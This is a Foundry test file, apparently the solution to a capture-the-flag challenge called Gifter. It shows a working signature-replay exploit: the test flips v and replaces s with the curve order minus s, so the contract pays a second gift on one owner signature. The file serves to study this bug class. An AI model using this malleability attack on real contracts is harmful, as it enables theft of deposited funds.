// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import {Test, console} from "forge-std/Test.sol";

import {Gifter} from "src/ctf-1/Gifter.sol";

// forge test --mc GifterTest -vvv
contract GifterTest is Test {
    Gifter internal _gifter;

    address internal _owner;
    uint256 internal _privateKey;

    address internal _user = makeAddr("user");

    function setUp() public {
        _privateKey = vm.envUint("PRIVATE_KEY");
        _owner = vm.addr(_privateKey);

        vm.deal(_owner, 10 ether);

        vm.startPrank(_owner);
        _gifter = new Gifter();
        _gifter.deposit{value: 10 ether}();
        vm.stopPrank();

        vm.deal(_user, 1 ether);
        vm.prank(_user);
        _gifter.deposit{value: 1 ether}();
    }

    function testGame() public {
        assertEq(_gifter.deposited(_owner), 10 ether);
        assertEq(_gifter.deposited(_user), 1 ether);

        assertEq(address(_gifter).balance, 11 ether);
        assertEq(_user.balance, 0);

        bytes32 msgHash = keccak256(abi.encode(_user));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(_privateKey, msgHash);

        _gifter.sendGift(_user, v, r, s);

        assertEq(address(_gifter).balance, 9 ether);
        assertEq(_user.balance, 2 ether);

        vm.prank(_user);
        _gifter.sendGift(
            _user,
            v == 27 ? 28 : 27,
            r,
            bytes32(
                115792089237316195423570985008687907852837564279074904382605163141518161494337 -
                    uint256(s)
            )
        );

        console.log("Gifter balance:", address(_gifter).balance);
        console.log("User balance:", _user.balance);

        console.log("Gifter balance should be 7 ether:", address(_gifter).balance == 7 ether);
        console.log("User balance should be 4 ether:", _user.balance == 4 ether);

        assertEq(address(_gifter).balance, 7 ether);
        assertEq(_user.balance, 4 ether);
    }
}
